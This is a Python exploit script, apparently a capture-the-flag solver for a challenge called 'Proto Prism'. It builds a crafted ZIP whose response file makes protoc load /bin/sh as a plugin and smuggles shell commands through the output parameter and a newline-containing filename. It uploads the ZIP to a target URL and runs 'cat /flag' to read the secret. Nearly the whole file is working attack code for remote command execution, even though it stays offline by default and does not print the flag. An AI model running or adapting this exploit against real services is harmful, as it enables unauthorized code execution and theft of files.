#!/usr/bin/env python3
"""Proto Prism ZIP builder and historical HTTP replay.

This is a compact adaptation of the solver reconstructed by the agent.
By default only creates an offline ZIP. An explicit --url is required
for HTTP; no remote traffic is generated during ordinary file creation.

Requirements for --url: pip install requests
"""
import argparse
import io
import json
import zipfile
from pathlib import Path

SERVICE = b'''syntax = "proto3";
package prism;
message R { string v = 1; }
message S { string v = 1; }
service P { rpc Ping(R) returns (S); }
'''
ARGS_PROTO = b'syntax = "proto3"; package opts; message Marker {string v = 1;}\n'
TRIGGER_PROTO = b'syntax = "proto3"; package attack; message Trigger {string v = 1;}\n'
EVIL_NAME = "#AAAAAAAAAAAAAAAAAA\nBBBBBBBBB.proto"
assert len(EVIL_NAME.encode()) == 35

def add(z, name, data):
    entry = zipfile.ZipInfo(name, (2026, 1, 1, 0, 0, 0))
    entry.create_system = 3
    entry.external_attr = 0o100644 << 16
    entry.compress_type = zipfile.ZIP_DEFLATED
    z.writestr(entry, data)

def safe_parameter(text):
    p = ";" + text + ";exit 0;#"
    # Avoid special characters in the protobuf length-byte near the
    # plugin parameter (a detail from the original successful builder).
    while len(p.encode()) % 256 in (0x22, 0x27, 0x5c, 0x60, 0x23, 0x3b, 0x0a):
        p += " "
    return p

def make_zip(command):
    response = ("--plugin=protoc-gen-x=/bin/sh\n"
                "--x_out=" + safe_parameter(command) + ":.\n").encode()
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w") as z:
        add(z, "args.proto", response)
        add(z, "protos/@args.proto", ARGS_PROTO)
        add(z, "protos/" + EVIL_NAME, TRIGGER_PROTO)
        add(z, "protos/service.proto", SERVICE)
    return out.getvalue()

def send(url, command):
    import requests
    resp = requests.post(url.rstrip("/") + "/generate",
                         files={"bundle": ("bundle.zip", make_zip(command), "application/zip")},
                         timeout=120)
    text = None
    if resp.ok:
        obj = resp.json()
        text = next((item.get("protoText") for item in obj.get("resources", [])
                     if item.get("_type") == "proto_file" and item.get("name") == "service.proto"), None)
    return resp.status_code, text

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--make-zip", metavar="PATH", help="Create a ZIP without network access")
    ap.add_argument("--command", default="echo RUNOK-MARKER > protos/service.proto")
    ap.add_argument("--url", help="Historical challenge instance; explicitly enables HTTP")
    args = ap.parse_args()
    if args.make_zip:
        payload = make_zip(args.command)
        Path(args.make_zip).write_bytes(payload)
        print("Wrote", len(payload), "bytes to", args.make_zip)
    if args.url:
        status, data = send(args.url, "echo RUNOK-MARKER > protos/service.proto")
        print("marker HTTP", status, "matched:", bool(data and "RUNOK-MARKER" in data))
        if not data or "RUNOK-MARKER" not in data:
            raise SystemExit("Marker failed; no flag request attempted")
        status, data = send(args.url, "cat /flag > protos/service.proto")
        print("flag HTTP", status)
        print("flag-shaped output:", bool(data and data.startswith("gctf{")))
        # Do not print the private flag by default.
    if not args.make_zip and not args.url:
        ap.print_help()

if __name__ == "__main__":
    main()
